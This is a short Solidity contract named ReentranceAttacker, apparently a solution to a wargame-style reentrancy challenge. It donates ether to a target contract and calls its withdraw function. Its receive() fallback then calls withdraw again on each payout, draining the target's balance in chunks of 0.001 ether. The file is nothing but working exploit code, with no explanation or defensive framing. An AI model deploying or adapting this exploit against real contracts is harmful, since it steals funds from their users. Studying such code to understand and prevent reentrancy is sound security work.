// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentranceAttacker {
    function attack(address target) public payable {
        (bool success, ) = target.call{value: msg.value}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(success, "Donate failed");
        (success, ) = target.call(
            abi.encodeWithSignature("withdraw(uint256)", msg.value)
        );
        require(success, "Call failed.");
    }

    receive() external payable {
        uint256 amount = msg.sender.balance;
        if (amount == 0) return;
        if (amount > 0.001 ether) {
            amount = 0.001 ether;
        }
        msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", amount));
    }
}
